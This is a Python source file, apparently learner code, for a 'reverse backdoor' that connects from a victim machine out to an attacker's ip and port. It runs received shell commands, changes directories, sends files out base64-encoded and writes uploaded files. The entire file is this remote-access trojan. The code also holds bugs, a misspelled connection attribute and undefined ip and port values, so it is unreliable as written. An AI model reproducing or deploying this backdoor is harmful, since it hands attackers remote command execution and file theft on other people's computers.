# coding reverse backdoor in python 
# the main function is to let the user try to connect to us instead to we trying to coonnect to user

# ------------------------------- start of code -----------------------------

import os
import json
import socket
import base64
import subprocess

class Suspicious:
    def __init__(self, ip, port):
        self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connetion.send("[+] Connection Success.\n".encode('utf-8'))

    def execute_system_commands(self, command):
        # the output data type of the check_output method is byte
        return subprocess.check_output(command, shell=True).decode('utf-8')

    def changeWorkingDirectory(self, path):
        os.chdir(path)
        return "[+] Changed current working folder to " + str(path)

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def download_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] File upload success"

    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.connetion.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def send_data(self, data):
        json_data = json.dumps(data)
        self.connetion.send(json_data.encode('utf-8'))

    def start(self):
        while True:
            try:
                data_received = self.receive_data()
                if data_received[0].lower() == 'exit':
                    self.connetion.close()
                    exit()
                elif data_received[0].lower() == 'cd' and len(data_received) >1:
                    command_result = self.changeWorkingDirectory(data_received[1])
                elif data_received[0].lower() == 'download':
                    command_result = self.read_file(data_received[1])
                elif data_received[0].lower() == 'upload':
                    command_result = self.download_file(data_received[1], data_received[2])
                else:
                    command_result = self.execute_system_commands(data_received)
                self.send_data(command_result)
            except subprocess.CalledProcessError as error:
                self.send_data("-------[=] Error => subprocess.CalledProcessError [=] -------")
            except Exception as error:
                self.send_data("---- [=] Error while executing command [=] ----")
                self.send_data("---- [=] Connection is still intact though [=] ----")

# these ip and port values are of hackers system values
backdoor = Suspicious(ip, port)
backdoor.start()